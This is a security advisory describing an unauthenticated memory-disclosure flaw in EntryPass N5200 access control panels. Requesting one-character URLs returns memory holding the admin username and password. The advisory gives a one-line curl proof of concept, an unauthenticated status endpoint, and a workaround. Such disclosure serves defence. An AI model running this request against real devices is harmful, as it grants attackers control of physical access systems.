Introduction
============

"EntryPass Active Networks are designed to enhance highly customized and
rapid 'real-time' changes to the underlying network operation.
Brilliantly engineered with all the power you need to enable
code-sending, minus unnecessary buffer time with its distributed
architecture capable of processing access demand at the edge level
without leveraging at the server end."

(From the vendor's home page)


More Details
============

EntryPass N5200 Active Network Control Panels offer an HTTP service on
TCP port 80. It appears that only the first character of a requested
URL's path is relevant to the web server. For example, requesting the
URL

http://example.com/1styles.css

yields the same CSS file as requesting the following URL:

http://example.com/1redteam

By enumerating all one-character long URLs on a device, it was
determined that URLs starting with a numeric character are used by the
web interface, as listed in the following table:

   http://example.com/0       Index
   http://example.com/1       Stylesheet
   http://example.com/2       Authentication with Username/Password
   http://example.com/3       Session Management
   http://example.com/4       Device Status
   http://example.com/5       Progressbar Image
   http://example.com/6       Reset Status
   http://example.com/7       Login Form
   http://example.com/8       HTTP 404 Error Page
   http://example.com/9       JavaScript

For URLs starting with non-numeric characters, an HTTP 404 - Not Found
error page is normally returned. Exceptions to this rule are URLs
starting with the lower case letters o to z and the upper case letters A
to D. When requesting these URLs, memory contents from the device appear
to be returned in the server's HTTP response.

As highlighted in the following listing, both the currently set username
ADMIN and the corresponding password 123456 are disclosed in the memory
contents when requesting the URL http://example.com/o:

$ curl -s http://example.com/o | hexdump -C | head
[...]
0010 XX XX XX XX XX XX XX XX  XX XX XX 77 77 77 2e 65 |XXXXXXXXXXXwww.e|
0020 6e 74 72 79 70 61 73 73  2e 6e 65 74 00 00 00 00 |ntrypass.net....|
[...]
0060 XX XX XX XX XX XX XX XX  XX XX 41 44 4d 49 4e 26 |XXXXXXXXXXADMIN&|
0070 20 20 31 32 33 34 35 36  26 20 XX XX XX XX XX XX |  123456& XXXXXX|
[...]

These credentials grant access to the administrative web interface of
the device when using them in the regular login form.

Similarly, it is possible to get the status output of the device without
prior authentication by simply requesting the following URL

http://example.com/4

The server responds to the request with the following XML data, which
contains information about various different settings of the device.

<html>
<head>
<title>Device Server Manager</title>
</head>
<body>
<serial_no>XXXXXXXXXXXX-XXXX</serial_no>
<firmware_version>HCB.CC.S1.04.04.11.02 -N5200[64Mb]</firmware_version>
<mac_address>XX-XX-XX-XX-XX-XX</mac_address>
<disable_reporting>disabled</disable_reporting>
<commit_setting>checked</commit_setting>
<user_id>ADMIN</user_id>
<user_pass>******</user_pass>
[...]
</body>
</html>


Proof of Concept
================

------------------------------------------------------------------------
$ curl -s http://example.com/o | hexdump -C | head
------------------------------------------------------------------------


Workaround
==========

Access to the web interface should be blocked at the network layer.


Fix
===

Not available.


Security Risk
=============

Attackers with network access to an EntryPass N5200 Active Network
Control Panel can retrieve memory contents from the device. These memory
contents disclose the currently set username and password needed to
access the administrative interface of the device. Using these
credentials, it is possible to read the device's current status and
configuration, as well as modify settings and install firmware updates.

With regards to the device itself, this vulnerability poses a high risk,
as it allows attackers to gain full control. The actual operational risk
depends on how the device is used in practice.
